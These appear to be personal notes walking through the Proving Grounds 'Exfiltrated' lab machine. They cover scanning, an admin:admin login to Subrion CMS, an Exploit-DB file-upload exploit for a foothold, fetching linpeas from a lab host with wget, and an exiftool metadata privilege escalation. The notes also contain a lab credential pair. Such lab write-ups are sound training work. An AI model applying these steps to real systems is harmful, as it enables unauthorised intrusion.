```
sudo nmap -sC -sV 192.168.208.163  -oN nmap-exfiltrated
```

![[PG/Linux/attachments/Pasted image 20250703220521.png]]

Running all ports scan too - nothing

# Website Enum 

Gobuster is being weird. 

Found admin login. 
![[PG/Linux/attachments/Pasted image 20250703221106.png]]
- CMS Subrion CMS v4.2.1
- admin:admin creds worked to login 

I'm in as admin:admin 

Offsec also gave these creds: 
```
coaran / SalveSubsistTopology342
```

# Exploits for CMS

There's an arbitrary file upload vuln
https://www.exploit-db.com/exploits/49876

This exploit worked. I am www-data user 

![[PG/Linux/attachments/Pasted image 20250703222045.png]]

These provided creds also worked for initial access though through ssh 

![[PG/Linux/attachments/Pasted image 20250703222347.png]]

# Enum for priv esc 

sudo -l doesn't work (user not sudoer)

No interesting SUID bins or capabilities 
![[PG/Linux/attachments/Pasted image 20250703222916.png]]

Okie gonna run linpeas 

```
wget http://192.168.45.152:8888/linpeas.sh
```

More creds

![[PG/Linux/attachments/Pasted image 20250703233930.png]]

interesting files in /opt
![[PG/Linux/attachments/Pasted image 20250703234244.png]]

Another .sh file 
![[PG/Linux/attachments/Pasted image 20250703234323.png]]
Probs need to check this out 

![[PG/Linux/attachments/Pasted image 20250703235133.png]]

![[PG/Linux/attachments/Pasted image 20250703235444.png]]
- no full path on exiftool
- attempted to hijack the exiftool binary but it did not work :(

The Priv Esc end up being this related to adding malicious metadata that exiftool executes. 

https://www.exploit-db.com/exploits/50911

[Write-Up](https://gbozyelg.medium.com/proving-grounds-practice-exfiltrated-4c11efba893d)

